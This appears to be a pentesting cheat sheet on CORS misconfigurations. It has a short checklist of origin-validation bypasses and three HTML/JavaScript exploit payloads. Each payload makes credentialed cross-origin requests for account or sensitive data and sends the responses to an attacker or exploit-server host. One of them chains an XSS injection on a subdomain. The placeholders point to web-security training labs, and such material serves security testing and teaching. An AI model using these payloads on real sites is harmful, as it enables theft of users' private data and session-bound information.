
### Things to check 

1. Check if origin is reflected. 
2. Check for parsing errors by adding to the allowed site. So for allow.com, you can try hack-allow.com, or allow.com.hack.net.
3. Null origins.



### Payloads

Script example that can be used to test cors attack if vulnerable. Hosted on an attacker website:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable_site.com/sentitive-data',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://maliciouswebsite/log?key='+this.responseText;
    };
</script>
```


iframe sandbox useful for nullchecks:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

Payload for exploiting subdomain that may be vuln to http downgraded.
```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```